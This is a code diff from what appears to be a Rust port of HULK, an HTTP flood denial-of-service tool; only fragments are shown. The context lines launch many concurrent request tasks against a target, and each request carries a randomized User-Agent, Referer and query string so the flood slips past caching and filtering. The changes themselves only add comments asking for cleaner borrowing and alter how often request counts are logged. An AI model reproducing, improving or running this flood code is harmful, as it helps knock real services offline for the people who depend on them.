@@ -92,6 +92,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("[*] Starting HULK attack on {}", args.target);
     let tasks = (0..args.max_connections).map(|_| {
         // clone the arguments to pass to the task since we are move-ing them
+        // Is there a cleaner way to do this ?
         let target = args.target.clone();
         let parameter_name = args.parameter_name.clone();
         let user_agents = user_agents.clone();
@@ -139,6 +140,8 @@ async fn fetch_url(
             referers[rand::thread_rng().gen_range(0..referers.len())],
             random_string(rand::thread_rng().gen_range(5..10))
         );
+        // I need to clone this, otherwise I get borrowing issues.
+        // I'm new to Rust and there might be a cleanr way to do this. Feel free to submit a PR.
         let user_agent = user_agents[rand::thread_rng().gen_range(0..user_agents_len)].clone();
         let request = Request::get(uri)
             .header("User-Agent", user_agent)
@@ -161,8 +164,8 @@ async fn fetch_url(
             }
             ERR_COUNT.fetch_add(1, Ordering::Relaxed);
         }
-        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
-        if total_reqs % 100 == 1 {
+        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed);
+        if total_reqs % 10 == 0 {
             let err_count = ERR_COUNT.load(Ordering::Relaxed);
             // sometimes the error count is higher than total requests
             // so we need to check for that not to get a substract with overflow
